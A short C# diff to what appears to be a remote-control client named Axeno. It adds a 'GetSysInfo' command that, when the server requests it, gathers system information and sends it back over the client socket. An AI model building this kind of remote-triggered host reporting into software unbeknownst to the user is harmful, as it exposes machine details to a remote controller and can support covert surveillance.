@@ -1,5 +1,6 @@
 ﻿using Axeno.Client.MessagePack;
 using Axeno.Client.Networking.Functions;
+using Axeno.Client.Networking.Functions.General;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -42,6 +43,11 @@ namespace Axeno.Client.Networking
                             string uid = msgpck.ForcePathObject("UID").AsString;
                             MessageBox.Show(uid);
                             ClientControl.SaveUID(uid);
+                            break;
+                        }
+                    case "GetSysInfo":
+                        {
+                            ClientSocket.Send(GetSystemInfo.Retrieve());
                             break;
                         }
                 }
